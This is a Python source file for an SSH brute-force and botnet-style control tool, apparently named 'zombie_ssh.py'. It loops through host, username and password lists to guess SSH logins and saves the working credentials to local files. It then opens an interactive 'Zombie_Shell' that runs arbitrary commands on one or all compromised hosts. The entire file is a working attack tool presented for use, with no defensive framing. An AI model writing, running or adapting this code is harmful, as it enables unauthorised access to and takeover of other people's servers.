import paramiko
import os
import socket
import time
import argparse
import sys
import os
import platform
host_list =""
time_out = 1
user_list =""
pass_list =""
ssh_user_list =""
ssh_host_list =""
ssh_pass_list =""
a_1_ =""
h =""

ssh_command =""
colors = True  # Output should be colored
machine = sys.platform  # Detecting the os of current system
checkplatform = platform.platform() # Get current version of OS
if machine.lower().startswith(('os', 'win', 'darwin', 'ios')):
    colors = False  # Colors shouldn't be displayed in mac & windows
if checkplatform.startswith("Windows-10") and int(platform.version().split(".")[2]) >= 10586:
    colors = True
    os.system('')   # Enables the ANSI
if not colors:
    end = red = white = green = yellow = run = bad = good = info = que = ''
else:
    white = '\033[97m'
    green = '\033[92m'
    red = '\033[91m'
    yellow = '\033[93m'
    end = '\033[0m'
    back = '\033[7;91m'
    info = '\033[93m[!]\033[0m'
    que = '\033[94m[?]\033[0m'
    bad = '\033[91m[-]\033[0m'
    good = '\033[92m[+]\033[0m'
    run = '\033[97m[~]\033[0m'
logo=f"""
{yellow}
 __ __   
(_ (_ |_|
__)__)| |
{end}
{red}
 __________  __  __ ____ _____ ______ 
|___  / __ \|  \/  |  _ \_   _|  ____|
   / / |  | | \  / | |_) || | | |__   
  / /| |  | | |\/| |  _ < | | |  __|  
 / /_| |__| | |  | | |_) || |_| |____ 
/_____\____/|_|  |_|____/_____|______|
{end}
{yellow}Version:1.2{end}
{green}By:@SMDD{end}
{yellow}usage:{end} zombie_ssh.py [-h] [-h_l HOST_LIST_] [-p_l PASS_LIST_]
                     [-u_l USER_LIST_] [-t TIMEOUT_]
"""
def main():
    print(logo)
    global host_list
    global user_list
    global pass_list
    global time_out
    parser = argparse.ArgumentParser()
    parser.add_argument('-h_l','--host-list', help='SSH Host List File',
                        dest='host_list_', type=str)
    parser.add_argument('-p_l','--password-list', help='SSH Password List File',
                        dest='pass_list_', type=str)
    parser.add_argument('-u_l','--username-list', help='SSH Username List File',
                        dest='user_list_', type=str)
    parser.add_argument('-t','--timeout', help='Set Timeout',
                        dest='timeout_', type=int)
    args = parser.parse_args()
    host_list = args.host_list_
    pass_list = args.pass_list_
    user_list = args.user_list_
    time_out = args.timeout_
    start()
def start():
    global host_list
    global user_list
    global pass_list
    global ssh_host_list
    global ssh_user_list
    global ssh_pass_list
    a = open(host_list,"r").readlines()
    b = open(user_list,"r").readlines()
    c = open(pass_list,"r").readlines()
    for ssh_host_list in a:
        ssh_host_list = ssh_host_list.strip()
        for ssh_user_list in b:
            ssh_user_list = ssh_user_list.strip()
            for ssh_pass_list in c:
                ssh_pass_list = ssh_pass_list.strip()
                run()
def run():
    global host_list
    global user_list
    global pass_list
    global ssh_host_list
    global ssh_user_list
    global ssh_pass_list
    global time_out
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ssh_host_list,22,ssh_user_list,ssh_pass_list,timeout=int(time_out))
    except:
        print(f"{bad}["+str(ssh_host_list)+"]Connect Failure ")
    else:
        print(f"{good}["+str(ssh_host_list)+"]Connect Success ")
        a_ = open("SSH Temporary file of zombie host.Garbled","a")
        b_ = open("SSH Temporary file of zombie user.Garbled","a")
        c_ = open("SSH Temporary file of zombie pass.Garbled","a")
        a_.write(str(ssh_host_list)+'\n')
        b_.write(str(ssh_user_list)+'\n')
        c_.write(str(ssh_pass_list)+'\n')
        shell()
def getshell():
    global time_out
    global a_1_
    global ssh_command
    ssh_ = paramiko.SSHClient()
    ssh_.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    a_1 = open("SSH Temporary file of zombie host.Garbled","r").readlines()
    b_1 = open("SSH Temporary file of zombie user.Garbled","r").readlines()
    c_1 = open("SSH Temporary file of zombie pass.Garbled","r").readlines()
    for a_1_ in a_1:
        a_1_ = a_1_.strip()
        for b_1_ in b_1:
            b_1_ = b_1_.strip()
            for c_1_ in c_1:
                c_1_ = c_1_.strip()
                try:
                    ssh_.connect(a_1_,22,b_1_,c_1_,timeout=time_out)
                except:
                    print(f"{bad}Error")
    while True:
        ssh_command = input(f"{yellow}All{end}&{red}Host~Zombie_Shell{end}{green}${end}")
        open("SSH Temporary file of zombie host.Garbled","w")
        open("SSH Temporary file of zombie user.Garbled","w")
        open("SSH Temporary file of zombie pass.Garbled","w")
        stdin, stdout, stderr = ssh_.exec_command(ssh_command)
        print(f"{info}Command==>",ssh_command)
        print(f"{good}From Zombie Host==>[",a_1,"]Info Data"+'\n'+stdout.read().decode("utf-8","ignore"))
def shell():
    global ssh_host_list
    global h
    s = f"""
    {yellow}
    |
    {end}
    """
    smf = input(s+f"{red}Host{end}-->")
    h = smf
    if smf =="all":
        getshell()
    else:
        exit
    one_shell()
def one_shell():
    global h
    global time_out
    ssh_ = paramiko.SSHClient()
    ssh_.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    smf_1 = input(f"{yellow}@"+str(h)+f"{end}~{red}User{end}?#")
    smf_2 = input(f"{yellow}@"+str(h)+f"{end}~{red}Pass{end}?#")
    ssh_.connect(h,22,smf_1,smf_2,timeout=time_out)
    while True:
        ssh_command = input(f"{red}@{end}"+str(h)+f"{yellow}~shell{end}{red}${end}")
        stdin, stdout, stderr = ssh_.exec_command(ssh_command)
        open("SSH Temporary file of zombie host.Garbled","w")
        open("SSH Temporary file of zombie user.Garbled","w")
        open("SSH Temporary file of zombie pass.Garbled","w")
        print(stdout.read().decode("utf-8","ignore"))
main()


